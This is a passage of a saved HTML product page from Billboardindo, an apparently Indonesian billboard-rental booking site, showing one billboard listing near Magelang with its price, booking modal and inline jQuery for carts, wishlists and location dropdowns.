<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Home Page - Billboardindo</title>


    <link rel="stylesheet" href="/mediaweb/lib/bootstrap/dist/css/bootstrap.css" />
    <link rel="stylesheet" href="/mediaweb/lib/bootstrap/dist/css/bootstrap.min.css" />
    <link rel="stylesheet" href="/mediaweb/css/font-awesome.min.css" />

    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css" />
    <link rel="stylesheet" type="text/css" href="slick.css" />
    <link rel="stylesheet" type="text/css" href="slick-theme.css" />


    <style type="text/css">
        #map_canvas {
            height: 400px;
        }
    </style>

    <link href="/mediaweb/favicon.ico" rel="shortcut icon" type="image/x-icon" />
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/mediaweb/css/jquery-ui.css" />
    <link rel="stylesheet" href="/mediaweb/css/bootstrap/bootstrap-datetimepicker.css" />
    <link rel="stylesheet" href="/mediaweb/css/simple-sidebar.css" />
    <link rel="stylesheet" href="/mediaweb/css/basic.css" />
    <link rel="stylesheet" href="/mediaweb/css/dropzone.css" />
    <link rel="stylesheet" href="/mediaweb/css/site.css" />
    <link rel="stylesheet" href="/mediaweb/css/login.css" />
    <link rel="stylesheet" href="/mediaweb/css/custom.css" />
    <link rel="stylesheet" href="/mediaweb/css/buttons.dataTables.min.css" />
    <link rel="stylesheet" href="/mediaweb/css/jquery.dataTables.min.css" />


    <link rel="stylesheet" href="css/mystyle.css">
    <link rel="stylesheet" href="css/dashboardcss.css">
</head>

<body class="debug_mode">
    <div class="d-flex" id="wrapper">
        <div id="loadmodal" class="modal fade bd-example-modal-lg" data-backdrop="static" data-keyboard="false"
            tabindex="-1">
            <div class="modal-dialog modal-sm">
                <div class="modal-content" style="width: 48px">
                    <span class="fa fa-spinner fa-spin fa-3x"></span>
                </div>
            </div>
        </div>

        <!-- Sidebar -->
        <div class="bg-light border-right bg-header" id="sidebar-wrapper" style="display:none;">
            <div class="sidebar-heading" style="background:white;"><a class="nav-link txt-black"
                    style="background:white !important;" href="/MediaWebDev">Billboardindo</a></div>
            <div class="list-group list-group-flush">
                <a id="homeMenu" class="nav-link txt-white" style="border-style:groove;margin-left:-3px;width:101%;"
                    href="/MediaWebDev">Home</a>
                <a id="dashboardMenu" class="nav-link txt-white"
                    style="border-style:groove;margin-left:-3px;width:101%;" href="/MediaWebDev/Dashboard">Dashboard</a>
                <a id="uploadsiteMenu" class="nav-link txt-white"
                    style="border-style:groove;margin-left:-3px;width:101%;" href="/MediaWebDev/ExportImport">
                    <img src="/MediaWebDev/image/iconupl.svg" style="width:25px"> Upload Site
                </a>
                <a id="userMenu" class="nav-link txt-white" style="border-style:groove;margin-left:-3px;width:101%;"
                    href="/MediaWebDev/Users">
                    <img src="/MediaWebDev/image/iconusp.svg" style="width:25px"> User
                </a>
                <a id="mownerMenu" class="nav-link txt-white" style="border-style:groove;margin-left:-3px;width:101%;"
                    href="/MediaWebDev/Dashboard">Media Owner</a>
                <a id="orderMenu" class="nav-link txt-white" style="border-style:groove;margin-left:-3px;width:101%;"
                    href="/MediaWebDev/Dashboard">Order</a>
                <a id="listsiteMenu" class="nav-link txt-white" style="border-style:groove;margin-left:-3px;width:101%;"
                    href="/MediaWebDev/Site">
                    <img src="/MediaWebDev/image/iconlst.svg" style="width:25px"> List Site
                </a>
                <a id="bankaccountMenu" class="nav-link txt-white"
                    style="border-style:groove;margin-left:-3px;width:101%;" href="/MediaWebDev/BankAccount">
                    <img src="/MediaWebDev/image/iconbac.svg" style="width:25px"> Bank Accounts
                </a>
                <button id="regionMenu" class="dropdown-btn txt-white"
                    style="border-style:groove;margin-left:-3px;width:101%;">
                    Region
                    <i class="fa fa-caret-down"></i>
                </button>
                <div class="dropdown-container" style="background:darkred;">
                    <a class="nav-link txt-white" style="background:darkred !important;"
                        href="/MediaWebDev/Province">Provinsi</a>
                    <a class="nav-link txt-white" style="background:darkred !important;"
                        href="/MediaWebDev/City">Kota</a>
                </div>
            </div>
        </div>
        <!-- /#sidebar-wrapper -->
        <!-- Page Content -->
        <div id="page-content-wrapper" style="margin-bottom:10%;">
            <nav class="navbar navbar-expand-lg navbar-light bg-light border-bottom bg-header">
                <!-- <button class="btn txt-white" id="menu-toggle">Menu</button> -->
                <div class="brand mt-2 mt-lg-0">
                    <h5>BILLBOARDINDO</h5>
                    <p class="text-center">Solusi Iklan Masa Depan Anda</p>
                </div>

                <button class="navbar-toggler" type="button" data-toggle="collapse"
                    data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                    aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div class="navbar-collapse collapse d-sm-inline-flex flex-sm-row-reverse txt-white"
                    id="navbarSupportedContent">
                    <ul class="navbar-nav ml-auto mt-2 mt-lg-0">
                        <li class="nav-item">
                            <a class="nav-link txt-white" href="#">About</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link txt-white" href="#">Company</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link txt-white" href="#">Product</a>
                        </li>
                        <li class="nav-item" style="padding-right: 30px;">
                            <a class="nav-link txt-white" href="#">Customer</a>
                        </li>
                        <li id="cartMenu" class="nav-item" style="padding-left:15px;">
                            <a class="nav-link txt-white" href="/mediaweb/Wish/Keranjang">
                                <i class="fas fa-shopping-cart" style="font-size:25px;"></i>
                            </a>
                        </li>
                        <li id="wishMenu" class="nav-item" style="padding-left:15px;">
                            <a class="nav-link txt-white" href="/mediaweb/Wish">
                                <i class="fa fa-bookmark" style="font-size:25px;"></i>
                            </a>
                        </li>
                        <li id="profileMenu" class="nav-item dropdown" style="">
                            <button class="dropbtn-nav txt-white">
                                <img src="/mediaweb/image/user.png" class="profile-image img-circle" style="width:25px">
                                Cone <i class="fa fa-caret-down"></i>
                            </button>
                            <div class="dropdown-content" style="left:0;padding-left:25px;">
                                <a class="nav-link txt-grey" href="/mediaweb/Profile/Update">Edit Profile</a>
                                <a class="nav-link txt-grey" href="/mediaweb/Profile/ChangePassword">Change Password</a>
                                <a class="nav-link txt-grey" href="/mediaweb/Profile/LogOut">Log Out</a>
                            </div>
                        </li>
                        <li id="loginMenu" class="nav-item" style="display:none;">
                            <a class="nav-link txt-white" href="/mediaweb/Login/Logon">Login</a>
                        </li>
                    </ul>
                </div>
            </nav>
            <div class="container container-fluid">



                <main role="main" class="pb-3">

                    <div class="row">
                        <div class="col-12">
                            <div class="box-header">
                                <p align="right">
                                    <a class="arrowLeft" id="backLink" style="float:left;">Back</a>
                                </p>
                            </div>
                        </div>
                        <div class="col-12" style="padding-top:20px;">
                            <div class="box">
                                <div class="row">
                                    <div class="col-md-8" style="padding-right:5%;">
                                        <div class="col-md-12" style="text-align:right;">
                                            <p style="font-size:2rem;">7285JTJW</p>
                                            <span class="fa fa-star checked"></span>
                                            <span class="fa fa-star checked"></span>
                                            <span class="fa fa-star checked"></span>
                                            <span class="fa fa-star checked"></span>
                                            <span class="fa fa-star"></span>
                                        </div>
                                        <div class="col-md-12">
                                            <div style="width:60%;">
                                                <p style="margin-bottom:5px;"><b>Lokasi</b></p>
                                                <p><i>Jl. FX Suhaji - Jl. Pemuda, Depan Tape Ketan Muntilan - View Dari
                                                        Arah Yogyakarta Ke Magelang </i></p>
                                            </div>
                                            <div>
                                                <p style="margin-bottom:5px;"><b>Details</b></p>
                                                <div style="display: flex;flex-wrap: nowrap;">
                                                    <div
                                                        style="border:2px solid;padding:10px;text-align:center;width:20%;">
                                                        <p style="margin-bottom:5px;">Ukuran</p>
                                                        <p style="margin-bottom:0px;"><b>4 X 6 Meter</b></p>
                                                    </div>
                                                    <div
                                                        style="border:2px solid;padding:10px;text-align:center;width:20%;">
                                                        <p style="margin-bottom:5px;">H/V</p>
                                                        <p style="margin-bottom:0px;"><b>V</b></p>
                                                    </div>
                                                    <div
                                                        style="border:2px solid;padding:10px;text-align:center;width:20%;">
                                                        <p style="margin-bottom:5px;">Tipe</p>
                                                        <p style="margin-bottom:0px;"><b>Billboard</b></p>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div style="text-align:right;padding:10px;height:10%;">
                                            <div class="col-md-4"
                                                style="color:red; border: 1px solid red;border-radius:1rem;padding: 10px;text-align: center;font-size: 18px; float:right;">
                                                <p style="margin:0px;">Rp. <span id="dtlPrice">500000</span>,-</p>
                                            </div>
                                        </div>
                                        <div class="col-md-12 viewbtn" style="width:100%;padding:10px;height:10%;">
                                            <div class="col-md-4" style="text-align:right;">
                                                <input type="button" value="&#xf02e;"
                                                    style="padding: 0px;margin: 0px;font-size: 2.8rem;color: #F7CD78;font-family: FontAwesome;background: none;box-shadow: none;margin-top: -10px;"
                                                    onclick="addWish('/MediaWebDev/Wish/AddToWishList', 'a13ade19-43f2-4a30-ad86-00a7df8e4504', 'fd91258e-d5dc-44f2-9212-7facb2238fee')" />
                                            </div>
                                            <div class="col-md-4" style="text-align:center;">
                                                <button id="keranjang" class="btn btn-secondary"
                                                    style="width:100%;height:100%;">
                                                    <span class="text-white">Masukan Keranjang</span>
                                                </button>
                                            </div>
                                            <div class="col-md-4" style="text-align:center;">
                                                <button class="btn btn-primary" style="width:100%;height:100%;">
                                                    <span class="text-white">Pesan Sekarang</span>
                                                </button>
                                            </div>
                                        </div>
                                    </div>
                                    <div id="rightview" class="col-md-4">
                                        <div
                                            style="display:block;margin-bottom:20px;border:1px solid;box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);">
                                            <div id="myCarousel" class="carousel slide" data-ride="carousel"
                                                style="height:300px">
                                                <!-- <ol class="carousel-indicators">
                                                    <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
                                                </ol> -->
                                                <div class="carousel-inner">
                                                    <div class="carousel-item active">
                                                        <img src="/MediaWeb/Upload/Image/7285JTJW/7285JTJW.jpg" alt=""
                                                            style="width:75%;height:300px;">
                                                    </div>
                                                </div>
                                                <!-- <a class="left carousel-control" href="#myCarousel" data-slide="prev">
                                                    <span class="glyphicon glyphicon-chevron-left"></span>
                                                    <span class="sr-only">Previous</span>
                                                </a>
                                                <a class="right carousel-control" href="#myCarousel" data-slide="next">
                                                    <span class="glyphicon glyphicon-chevron-right"></span>
                                                    <span class="sr-only">Next</span>
                                                </a> -->
                                            </div>
                                        </div>
                                        <div id="map_canvas3" style="height:350px"></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="modal fade" tabindex="-1" id="cartModal" data-keyboard="false"
                            data-backdrop="static">
                            <div class="modal-dialog modal-lg">
                                <div class="modal-content">
                                    <h2 class="active" style="color:red;"> Tambah ke keranjang </h2>
                                    <div class="modal-body">
                                        <form method="post" action="AddtoCart">
                                            <label>Durasi</label>
                                            <p style="color:red;">Minimum order 7 hari</p>
                                            <input id="siteID" type="hidden"
                                                value="a13ade19-43f2-4a30-ad86-00a7df8e4504">
                                            <input id="sitePriceID" type="hidden"
                                                value="c95e2742-79c3-4d10-b230-48dfdf120b5b">
                                            <input id="siteItemID" type="hidden"
                                                value="fd91258e-d5dc-44f2-9212-7facb2238fee">
                                            <input id="price" type="hidden" value="500000">
                                            <input id="durasi" type="hidden">
                                            <div class="form-group">
                                                <label>Mulai Tayang</label>
                                                <div class="input-group date" id="datepicker1">
                                                    <input type="text" class="form-control" placeholder="Start Date" />
                                                    <span class="glyphicon glyphicon-calendar"
                                                        style="background: #F6F6F6;padding: 5px;margin-top: 5px;margin-left: -10px;border-radius: 5px;">
                                                        <span class="fa fa-calendar-o" style="font-size:1.5rem;"></span>
                                                    </span>
                                                </div>
                                            </div>
                                            <div class="form-group">
                                                <label>Akhir Tayang</label>
                                                <div class="input-group date" id="datepicker2">
                                                    <input type="text" class="form-control" placeholder="End Date"
                                                        disabled />
                                                    <span class="glyphicon glyphicon-calendar"
                                                        style="background: #F6F6F6;padding: 5px;margin-top: 5px;margin-left: -10px;border-radius: 5px;">
                                                        <span class="fa fa-calendar-o" style="font-size:1.5rem;"></span>
                                                    </span>
                                                </div>
                                            </div>
                                            <div style="text-align:center;">
                                                <input id="popsubmit" type="button" value="Submit"
                                                    style="margin-bottom:15px;" disabled
                                                    onclick="addCart('/MediaWebDev/Site/AddtoCart')" />
                                                <input id="btnHideModal" type="button"
                                                    style="background-color:red;margin-bottom:15px;" value="Cancel">
                                            </div>
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                </main>
            </div>
        </div>
        <!-- /#page-content-wrapper -->
        <footer class="border-top footer text-muted bg-gray footer">
            <div class="container">
                <div class="row">
                    <div class="col-md-4">
                        <div class="footer-content1">
                            <h4>BILLBOARDINDO</h4>
                            <P>Solusi iklan masa depan anda</P>
                            <img class="img-responsive"
                                src="https://play.google.com/intl/en_us/badges/static/images/badges/en_badge_web_generic.png"
                                alt="" width="250px">
                        </div>
                    </div>
                    <div class="col-md-2">
                        <div class="footer-content">
                            <h5>Company</h5>
                            <p><a href="#">About</a></p>
                            <p><a href="#">Kontak</a></p>
                            <p><a href="#">FAQ</a></p>
                            <p><a href="#">Career</a></p>
                        </div>
                    </div>
                    <div class="col-md-2">
                        <div class="footer-content">
                            <h5>PRODUCT</h5>
                            <p><a href="#">Billboard</a></p>
                            <p><a href="#">Videotron</a></p>
                            <p><a href="#">Consultan</a></p>
                            <p><a href="#">Agency</a></p>
                        </div>
                    </div>
                    <div class="col-md-2">
                        <div class="footer-content">
                            <h5>Privacy</h5>
                            <p><a href="#">Legal</a></p>
                            <p><a href="#">Privacy</a></p>
                            <p><a href="#">Imprint</a></p>
                            <p><a href="#">Report Bug</a></p>
                        </div>
                    </div>
                    <div class="col-md-2">
                        <div class="footer-content"></div>
                        <h5>Customer</h5>
                        <p><a href="#">Complain</a></p>
                        <p><a href="#">Consulting</a></p>
                        <p><a href="#">Call Center</a></p>
                        <p><a href="#">Office</a></p>
                    </div>
                </div>

            </div>
            <!-- &copy; 2020 - Billboarindo - <a href="/mediaweb/Home/Privacy">Privacy</a> -->
        </footer>
    </div>
    <!-- /#wrapper -->


    <script type="text/javascript" src="/MediaWebDev/js/jquery/V3.4.1/jquery-v3.4.1.js" crossorigin="anonymous">
    </script>
    <script type="text/javascript" src="/MediaWebDev/lib/bootstrap/dist/js/bootstrap.bundle.js" crossorigin="anonymous">
    </script>


    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script type="text/javascript"
        src="/MediaWebDev/js/jquery/jquery-ui.js?v=T0Vest3yCU7pafRw9r-settMBX6JkKN06dqBnpQ8d30"></script>
    <script type="text/javascript" src="/MediaWebDev/js/site.js?v=4q1jwFhaPaZgr8WAUSrux6hAuh0XDg9kPS3xIVq36I0"></script>
    <script type="text/javascript" src="/MediaWebDev/js/dropzone.js?v=NLit4Z57jz8npRHkopjfr68hSZY1x_ruN0T8kf68xq4">
    </script>
    <script type="text/javascript" src="/MediaWebDev/js/dropzone.min.js?v=fIn7-wa-KI2s9jjRMk_rcswRt8mf82rxIXntRYKLofg">
    </script>
    <script type="text/javascript" src="https://maps.googleapis.com/maps/api/js"></script>
    <script type="text/javascript" src='https://kit.fontawesome.com/a076d05399.js'></script>
    <script type="text/javascript" src="/MediaWebDev/js/Moment-with-local.js"></script>
    <script type="text/javascript" src="/MediaWebDev/js/canvasjs.min.js"></script>
    <script type="text/javascript" src="/MediaWebDev/js/dropzone.js"></script>
    <script type="text/javascript" src="/MediaWebDev/js/dropzone.min.js"></script>
    <script type="text/javascript" src="/MediaWebDev/lib/jquery-validation/dist/jquery.validate.js"></script>
    <script type="text/javascript" src="/MediaWebDev/lib/jquery-validation-unobtrusive/jquery.validate.unobtrusive.js">
    </script>
    <script type="text/javascript" src="/MediaWebDev/js/bootstrap/bootstrap.min.js"></script>
    <script type="text/javascript" src="/MediaWebDev/js/bootstrap/bootsrap-datetimepicker.js"></script>
    <script type="text/javascript" src="/MediaWebDev/js/DataTable/jquery.dataTables.min.js"></script>
    <script type="text/javascript" src="/MediaWebDev/js/DataTable/dataTables.buttons.min.js"></script>
    <script type="text/javascript" src="/MediaWebDev/js/DataTable/buttons.flash.min.js"></script>
    <script type="text/javascript" src="/MediaWebDev/js/DataTable/buttons.html5.min.js"></script>
    <script type="text/javascript" src="/MediaWebDev/js/DataTable/buttons.print.min.js"></script>
    <script type="text/javascript" src="/MediaWebDev/js/DataTable/jszip.min.js"></script>
    <script type="text/javascript" src="/MediaWebDev/js/DataTable/pdfmake.min.js"></script>
    <script type="text/javascript" src="/MediaWebDev/js/DataTable/vfs_fonts.js"></script>
    <script>
        $("#menu-toggle").click(function (e) {
            e.preventDefault();
            $("#wrapper").toggleClass("toggled");
        });
        var dropdown = document.getElementsByClassName("dropdown-btn");
        for (var i = 0; i < dropdown.length; i++) {
            dropdown[i].addEventListener("click", function () {
                this.classList.toggle("active");
                var dropdownContent = this.nextElementSibling;
                if (dropdownContent.style.display === "block") {
                    dropdownContent.style.display = "none";
                } else {
                    dropdownContent.style.display = "block";
                }
            });
        }
        var mapsData = {
            "Cities": [{
                "Title": "7285JTJW",
                "Lat": -7.5906808,
                "Lng": 110.2912668
            }],
            "Site": {
                "Detail": {
                    "SiteID": "a13ade19-43f2-4a30-ad86-00a7df8e4504",
                    "NoBillboard": "7285JTJW",
                    "Pulau": "Jawa",
                    "Kota": "Magelang",
                    "Provinsi": "Jawa Tengah",
                    "Cabang": "",
                    "Ukuran": null,
                    "HorV": "V",
                    "Tipe": "Billboard",
                    "Longitude": "110.2912668",
                    "Latitude": "-7.5906808",
                    "RateScoreAverage": 0.0,
                    "Alamat": "Jl. FX Suhaji - Jl. Pemuda, Depan Tape Ketan Muntilan - View Dari Arah Yogyakarta Ke Magelang ",
                    "TotalView": 17
                },
                "Item": [{
                    "SiteID": "a13ade19-43f2-4a30-ad86-00a7df8e4504",
                    "SiteItemID": "fd91258e-d5dc-44f2-9212-7facb2238fee",
                    "ArahLokasi": "",
                    "KodeLokasi": null,
                    "Panjang": 4.0,
                    "Lebar": 6.0,
                    "Wishlist": {
                        "isWishlist": false,
                        "WishlistID": "00000000-0000-0000-0000-000000000000"
                    },
                    "Price": [{
                        "SitePriceID": "c95e2742-79c3-4d10-b230-48dfdf120b5b",
                        "SiteItemID": "fd91258e-d5dc-44f2-9212-7facb2238fee",
                        "Dasar": "",
                        "Kelipatan": 1.0,
                        "HargaAwal": 500000.0,
                        "HargaAkhir": 0.0,
                        "MinimDasar": "Hari",
                        "MinimOrder": 7
                    }],
                    "Image": [{
                        "SiteImageID": "a8c58a7a-a68f-4a06-9646-4d25637fee1f",
                        "SiteItemID": "fd91258e-d5dc-44f2-9212-7facb2238fee",
                        "Image": "/MediaWeb/Upload/Image/7285JTJW/7285JTJW.jpg"
                    }]
                }]
            }
        };
        var cities;
        if (mapsData != null) {
            cities = mapsData.Cities
        }
        var domain = 'MediaWebDev';
        var BaseUrl = window.location.origin;
        if (domain != "") {
            BaseUrl += "/" + domain;
        }
        var isFiltered = 'MDB';
        var siteIndexUrl = '/MediaWebDev/Site';

        function modalShow() {
            $("#loadmodal").modal("show");
        }

        function modalHide() {
            $("#loadmodal").modal("hide");
        }

        //#region UploadImage
        Dropzone.autoDiscover = false;
        if (document.getElementById("dropzoneJsForm")) {
            var myDropzone = new Dropzone("#dropzoneJsForm", {
                paramName: "file",
                maxFilesize: 20,
                maxFiles: 4,
                acceptedFiles: "image/*",
                dictMaxFilesExceeded: "Maximum files are 4 files 1 time.",
                init: function () {
                    this.on("success", function (data) {
                        console.log('Success');
                        console.log(data);
                    });
                }
            });
        }
        //#endregion

        //#region Dropdown
        function FillBank() {
            $.post(BaseUrl + "/Dashboard/GetBank", null, function (data) {
                if (data) {
                    //console.log(data);
                    var bankid = $("#bankIDHidden").val();
                    $("#lstbank").append("<option value=''>Pilih Bank</option>");
                    $(data).each(function () {
                        if (this.bankID == bankid) {
                            $("#lstbank").append('<option value=' + this.bankID + ' selected>' + this
                                .bank + '</option >');
                        } else {
                            $("#lstbank").append($('<option/>', {
                                value: this.bankID
                            }).html(this.bank));
                        }
                    });
                }
            }, 'json')
        }

        function FillType() {
            $.post(BaseUrl + "/Dashboard/GetType", null, function (data) {
                if (data) {
                    //console.log(data);
                    var typekode = $("#typeIDHidden").val();
                    $("#lsttype").append("<option value=''>Pilih Type</option>");
                    $(data).each(function () {
                        if (this.type == typekode) {
                            $("#lsttype").append('<option value=' + this.type + ' selected>' + this
                                .type + '</option >');
                        } else {
                            $("#lsttype").append($('<option/>', {
                                value: this.type
                            }).html(this.type));
                        }
                        //$("#stypemenu").append('<a href="#" class="filter smenu">' + this.type + '</a>');
                    });
                }
            }, 'json')
        }

        function FillProvince() {
            $.post(BaseUrl + "/Dashboard/GetProvince", null, function (data) {
                if (data) {
                    //console.log(data);
                    var provID = $("#selectedProv").val();
                    $("#lstprovince").append("<option value=''>Pilih Provinsi</option>");
                    $(data).each(function () {
                        if (this.provinsi == provID || this.provinceID == provID) {
                            $("#lstprovince").append('<option value=' + this.kode + '|' + this
                                .provinsi + ' selected>' + this.provinsi + '</option >');
                            $.post(BaseUrl + "/Dashboard/GetCity?kodeprov=" + this.kode, null,
                                function (data) {
                                    if (data) {
                                        $("#lstcity").empty();
                                        //console.log(data);
                                        var cityID = $("#selectedCity").val();
                                        $("#lstcity").append(
                                            "<option value=''>Pilih Kota</option>");
                                        $(data).each(function () {
                                            //console.log(this);
                                            if (this.kota == cityID) {
                                                $("#lstcity").append('<option value=' + this
                                                    .kota + ' selected>' + this.kota +
                                                    '</option >');
                                            } else {
                                                $("#lstcity").append($('<option/>', {
                                                    value: this.kota
                                                }).html(this.kota));
                                            }
                                        });
                                    }
                                }, 'json')
                        } else {
                            $("#lstprovince").append($('<option/>', {
                                value: this.kode + '|' + this.provinsi
                            }).html(this.provinsi));
                        }
                    });
                }
            }, 'json')
        }

        $("#lstprovince").change(function () {
            var kode = document.getElementById("lstprovince").value
            if (kode != 0) {
                kode = kode.split('|', 1);
                $.post(BaseUrl + "/Dashboard/GetCity?kodeprov=" + kode, null, function (data) {
                    if (data) {
                        $("#lstcity").empty();
                        //console.log(data);
                        var cityID = $("#selectedCity").val();
                        $("#lstcity").append("<option value=''>Pilih Kota</option>");
                        $(data).each(function () {
                            //console.log(this);
                            if (this.kota == cityID) {
                                $("#lstcity").append('<option value=' + this.kota +
                                    ' selected>' + this.kota + '</option >');
                            } else {
                                $("#lstcity").append($('<option/>', {
                                    value: this.kota
                                }).html(this.kota));
                            }
                        });
                    }
                }, 'json')
            }
        });
        //#endregion

        //#region NumberFormat
        function setInputFilter(textbox, inputFilter) {
            ["input", "keydown", "keyup", "mousedown", "mouseup", "select", "contextmenu", "drop"].forEach(function (
                event) {
                textbox.addEventListener(event, function () {
                    if (inputFilter(this.value)) {
                        this.oldValue = this.value;
                        this.oldSelectionStart = this.selectionStart;
                        this.oldSelectionEnd = this.selectionEnd;
                    } else if (this.hasOwnProperty("oldValue")) {
                        this.value = this.oldValue;
                        this.setSelectionRange(this.oldSelectionStart, this.oldSelectionEnd);
                    } else {
                        this.value = "";
                    }
                });
            });
        }

        function addCommas(nStr) {
            //console.log(nStr);
            nStr += '';
            var comma = /,/g;
            nStr = nStr.replace(comma, '');
            x = nStr.split('.');
            x1 = x[0];
            x2 = x.length > 1 ? '.' + x[1] : '';
            var rgx = /(\d+)(\d{3})/;
            while (rgx.test(x1)) {
                x1 = x1.replace(rgx, '$1' + ',' + '$2');
            }
            return x1 + x2;
        }
        //#endregion

        //#region DateFormat
        function formatDate(date) {
            //var monthNames = [
            //	"January", "February", "March",
            //	"April", "May", "June", "July",
            //	"August", "September", "October",
            //	"November", "December"
            //];
            var monthNames = [
                "Jan", "Feb", "Mar",
                "Apr", "May", "Jun", "Jul",
                "Aug", "Sep", "Oct",
                "Nov", "Dec"
            ];


            var day = date.getDate();
            var monthIndex = date.getMonth();
            var year = date.getFullYear();

            return day + ' ' + monthNames[monthIndex] + ' ' + year;
        }
        //#endregion

        //#region lOader
        function showLoader() {
            document.getElementById("loader").style.display = "block";
            document.getElementById("divload").style.display = "none";
        }

        function showPage() {
            document.getElementById("loader").style.display = "none";
            document.getElementById("divload").style.display = "block";
        }
        //#endregion

        //#region Cart
        function addtoCart(target, bookID) {
            $.post(target, {
                    ID: bookID
                },
                function (returnedData) {
                    $.get(domain + "/Wish/Keranjang", function (data, status) {
                        //alert("Data added to Cart");
                        location.reload(true);
                    });
                }).fail(function (e) {
                console.log("error");
                console.log(e);
            });
        }

        function deleteCart(target, bookID) {
            $.post(target, {
                    ID: bookID
                },
                function (returnedData) {
                    $.get(domain + "/Wish/Keranjang", function (data, status) {
                        alert("Data Deleted from Cart");
                        location.reload(true);
                    });
                }).fail(function (e) {
                console.log("error");
                console.log(e);
            });
        }
        //#endregion

        //#region AddtoWishList
        function addWish(target, site, item) {
            $.post(target, {
                    Site: site,
                    Item: item
                },
                function (returnedData) {
                    alert("Data Added to Wish List");
                }).fail(function (e) {
                console.log("error");
                console.log(e);
            });
        }

        function deleteCart(target, wishID) {
            console.log(wishID);
            $.post(target, {
                    ID: wishID
                },
                function (returnedData) {
                    $.get(domain + "/Wish/Index", function (data, status) {
                        alert("Data Deleted from Wishlist");
                        location.reload(true);
                    });
                }).fail(function (e) {
                console.log("error");
                console.log(e);
            });
        }
        //#endregion

        //#region Compare
        function addCompare(target, site, item) {
            $.post(target, {
                    Site: site,
                    Item: item
                },
                function (returnedData) {
                    alert("Data Added to Compare");
                    $.get(domain + "/Rest/ViewCompare", function (data, status) {
                        $('#comview').html(data);
                    });
                }).fail(function (e) {
                console.log("error");
                console.log(e);
            });
        }

        function deleteCompare(target, compareid) {
            $.post(target, {
                    compareID: compareid
                },
                function (returnedData) {
                    alert("Data deleted from Compare");
                    $.get(domain + "/Rest/ViewCompare", function (data, status) {
                        $('#comview').html(data);
                    });
                }).fail(function (e) {
                console.log("error");
                console.log(e);
            });
        }
        //#endregion

        function btnapprove(link) {
            modalShow();
            let target = link.split('|')[0];
            let dofor = link.split('|')[1];
            //$.post("/Dashboard/Update", { ID: target },
            $.post("/MediaWeb/Dashboard/Update", {
                    ID: target
                },
                function (returnedData) {
                    if (dofor.split('&')[1] == 'accept') {
                        alert("Nomor booking " + dofor.split('&')[0] + " berhasil diapprove")
                    } else {
                        alert("Nomor booking " + dofor.split('&')[0] + " berhasil ditolak")
                    }
                    //alert("Data Updated");
                    //$.get("/Dashboard/Index", function (data, status) {
                    $.get("/MediaWeb/Dashboard/Index", function (data, status) {
                        location.reload();
                    });
                    modalHide();
                }).fail(function (e) {
                alert("Fail to Update " + e);
                modalHide();
            });
        }

        //#region SC
        (function () {
            if (!$('body').hasClass('debug_mode')) {
                var _z = console;
                Object.defineProperty(window, "console", {
                    get: function () {
                        if ((window && window._z && window._z._commandLineAPI) || {}) {
                            return "Nice trick! but not permitted!";
                        }
                        return _z;
                    },
                    set: function (val) {
                        _z = val;
                    }
                });
            }
        })();
        //#endregion

        window.onload = function () {
            if (document.getElementById('chartContainer') != null) {
                var dataPoints = [];
                var chart = new CanvasJS.Chart("chartContainer", {
                    animationEnabled: true,
                    theme: "light2", // "light1", "light2", "dark1", "dark2"
                    title: {
                        text: "Billboard Monthly"
                    },
                    axisY: {
                        title: "Total Book"
                    },
                    data: [{
                        type: "column",
                        showInLegend: true,
                        legendMarkerColor: "grey",
                        legendText: "Total Book",
                        dataPoints: dataPoints,
                    }]
                });
                chart.render();
                dataPoints.push({
                    label: 'Jan',
                    y: parseInt('50')
                });
                dataPoints.push({
                    label: 'Feb',
                    y: parseInt('30')
                });
                dataPoints.push({
                    label: 'Mar',
                    y: parseInt('0')
                });
                dataPoints.push({
                    label: 'Apr',
                    y: parseInt('0')
                });
                dataPoints.push({
                    label: 'May',
                    y: parseInt('0')
                });
                dataPoints.push({
                    label: 'Jun',
                    y: parseInt('0')
                });
                dataPoints.push({
                    label: 'Jul',
                    y: parseInt('0')
                });
                dataPoints.push({
                    label: 'Aug',
                    y: parseInt('0')
                });
                dataPoints.push({
                    label: 'Sep',
                    y: parseInt('0')
                });
                dataPoints.push({
                    label: 'Oct',
                    y: parseInt('0')
                });
                dataPoints.push({
                    label: 'Nov',
                    y: parseInt('0')
                });
                dataPoints.push({
                    label: 'Dec',
                    y: parseInt('0')
                });
                chart.render();
            }
            if (document.querySelectorAll('.cust-date') != null) {
                var cdate = document.querySelectorAll('.cust-date');
                for (var i = 0; i < cdate.length; i++) {
                    cdate[i].innerHTML = formatDate(new Date(cdate[i].innerHTML.toString()));
                }
            }
            if (document.querySelectorAll('.cart-price') != null) {
                var cprice = document.querySelectorAll('.cart-price');
                for (var i = 0; i < cprice.length; i++) {
                    cprice[i].innerHTML = addCommas(cprice[i].innerHTML.toString());
                }
            }
        }

        //#region Wishlist
        $(".like-btn").on("click", function () {
            $(this).toggleClass("is-active");
        });
        $(".minus-btn").on("click", function (e) {
            e.preventDefault();
            var $this = $(this);
            var $input = $this.closest("div").find("input");
            var value = parseInt($input.val());

            if (value > 1) {
                value = value - 1;
            } else {
                value = 0;
            }
            $input.val(value);
        });
        $(".plus-btn").on("click", function (e) {
            e.preventDefault();
            var $this = $(this);
            var $input = $this.closest("div").find("input");
            var value = parseInt($input.val());

            if (value < 100) {
                value = value + 1;
            } else {
                value = 100;
            }
            $input.val(value);
        });
        //#endregion

        $(document).ready(function () {
            //#region NavBar
            //console.log(isFiltered);
